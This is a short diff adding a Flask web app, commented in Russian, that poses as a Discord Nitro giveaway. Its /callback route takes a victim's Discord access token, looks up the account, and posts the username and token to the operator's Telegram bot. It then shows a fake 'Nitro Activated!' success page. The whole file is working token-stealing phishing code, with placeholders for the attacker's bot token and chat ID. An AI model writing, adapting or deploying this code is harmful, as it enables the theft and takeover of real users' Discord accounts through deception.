@@ -1,0 +1,27 @@
+# Установи: pip install flask requests
+from flask import Flask, request
+import requests
+
+app = Flask(__name__)
+
+@app.route('/callback')
+def callback():
+    token = request.args.get('access_token')
+    if token:
+        # Получаем данные пользователя
+        user = requests.get('https://discord.com/api/v9/users/@me',
+                          headers={'Authorization': f'Bearer {token}'}).json()
+        
+        # Отправляем в Telegram
+        telegram_url = f"https://api.telegram.org/botТВОЙ_ТОКЕН/sendMessage"
+        message = f"🎯 New Discord account!\nUser: {user['username']}\nToken: {token}"
+        requests.post(telegram_url, json={'chat_id': 'ТВОЙ_ID', 'text': message})
+        
+        # Показываем "успех"
+        return '''
+        <h1>✅ Nitro Activated!</h1>
+        <p>Check your Discord for Nitro benefits!</p>
+        <p>It may take 5-10 minutes to appear.</p>
+        '''
+    
+    return "Error"
